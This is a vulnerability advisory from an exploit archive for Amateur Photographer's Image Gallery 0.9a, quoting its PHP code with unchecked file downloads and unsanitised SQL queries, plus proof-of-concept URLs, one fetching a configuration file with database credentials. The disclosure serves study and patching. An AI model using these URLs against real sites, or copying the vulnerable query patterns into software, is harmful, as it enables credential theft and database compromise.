@@ -1,0 +1,135 @@
+id: 19575
+date: 10/17/2012
+title: Amateur Photographer 's Image Gallery 0.9a XSS / SQL Injection
+author: cr4wl3r
+cves: 
+
+                                            
+                  Undergroundthalo Hacking Team - Security Advisory                   
+    ---------------------------------------------------------------------------    
+    Author  : cr4wl3r                           Release Date   : 18-Okt-2012          
+    Product : Amateur Photographer's Image      Size           : 302.3 kB             
+    Link    : http://sourceforge.net/projects/ap-imagegallery                         
+   ------------------------------------------ ------------------------------------- ´ 
+    gallery-0.9a.zip                                                                  
+                                      Details                                         
+                                                                                      
+   Amateur Photographer's Image Gallery 0.9a                                          
+                                                                                      
+   A image gallery for photographers who don't care if their photos are publicly      
+   available on the web. Offers many advanced features such as image preloading       
+   which enables you to switch photos without waiting for the next photo to load.     
+   In this vulnerability, attacker can download any file from server.                 
+   for example, downloading a configuration file contains information username        
+   database, another case attacker can inject database with SQL Injection             
+   or XSS only from URL                                                               
+ ------------------------------------------------------------------------------------ 
+  RFD Code in force-download.php
+
+<?php
+$filename = $_GET['file'];
+
+// required for IE, otherwise Content-disposition is ignored
+if(ini_get('zlib.output_compression'))
+  ini_set('zlib.output_compression', 'Off');
+
+// addition by Jorg Weske
+$file_extension = strtolower(substr(strrchr($filename,"."),1));
+
+if( $filename == "" ) 
+{
+  echo "<html><title>eLouai's Download Script</title><body>ERROR: download file NOT SPECIFIED. USE force-download.php?file=filepath</body></html>";
+  exit;
+} elseif ( ! file_exists( $filename ) ) 
+{
+  echo "<html><title>eLouai's Download Script</title><body>ERROR: File not found. USE force-download.php?file=filepath</body></html>";
+  exit;
+};
+switch( $file_extension )
+{
+  case "pdf": $ctype="application/pdf"; break;
+  case "exe": $ctype="application/octet-stream"; break;
+  case "zip": $ctype="application/zip"; break;
+  case "doc": $ctype="application/msword"; break;
+  case "xls": $ctype="application/vnd.ms-excel"; break;
+  case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
+  case "gif": $ctype="image/gif"; break;
+  case "png": $ctype="image/png"; break;
+  case "jpeg":
+  case "jpg": $ctype="image/jpg"; break;
+  default: $ctype="application/force-download";
+}
+header("Pragma: public"); // required
+header("Expires: 0");
+header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+header("Cache-Control: private",false); // required for certain browsers 
+header("Content-Type: $ctype");
+// change, added quotes to allow spaces in filenames, by Rajkumar Singh
+header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
+header("Content-Transfer-Encoding: binary");
+header("Content-Length: ".filesize($filename));
+readfile("$filename"); <------- BOOOOOOM
+exit();
+?>
+
+  SQLi Code plist.php
+
+<?php
+include 'database.php';
+$index = 1;
+$albumid = $_GET['albumid'];
+
+$folder = select_row("SELECT folder FROM albums where id = $albumid");
+$folder = $folder['folder'];
+
+$retid = select("SELECT * FROM photos where albumid = $albumid ORDER BY date, large");
+while ($row = mysql_fetch_array($retid))
+{
+  if ($index == 1) { echo "<tr>\n"; } // begin row
+  $small = $row["small"];
+  $id = $row["id"];
+  echo "<td width='200px' height='200px' align='center' valign='middle'><a href='photo.php?id=$id&albumid=$albumid'><img src='albums/$folder/$small' border='0' /></a></td>"; // display cell
+  if ($index == 3) { echo "\n</tr>";  $index = 1; } // end row
+  else { $index = $index + 1; } // increment count
+}
+?>
+
+  SQLi Code fullscreen.php
+
+  <?php
+    require 'database.php';
+    
+    // initialize variables
+    $current_photo_id = $_GET['id'];
+    $album_id = $_GET['albumid'];
+    $js_psuedo_index = 0;
+    $number_of_photos = -1;
+    echo "var img = [];\n";
+    
+    // find the folder where the photos are located and the album name
+    $row = select_row("SELECT * FROM albums where id = $album_id");
+
+    $folder = $row['folder'];
+    $album_name =  $row['name'];
+
+
+ ------------------------------------------------------------------------------------ 
+  Proof of Concept  :                                                                 
+                                                                                      
+  http://b0x/path_gallery/force-download.php?file=[RFD]                               
+  http://b0x/path_gallery/force-download.php?file=constants.php                       
+  http://b0x/path_gallery/plist.php?albumid=[SQLi]                                    
+  http://b0x/path_gallery/plist.php?albumid=[XSS]                                     
+  http://b0x/path_gallery/fullscreen.php?albumid=[SQLi]                               
+                                                                                      
+                                                                                      
+                                                                                      
+  Undergroundthalo Hacking Team                                                       
+  Site: http://0xuht.org                                                              
+  Twitter: @hackb0x                                                                   
+                   
+                                Happy Birhtday Saskia Adam :)                         
+
+
+
+#  0day.today [2023-03-24]  #
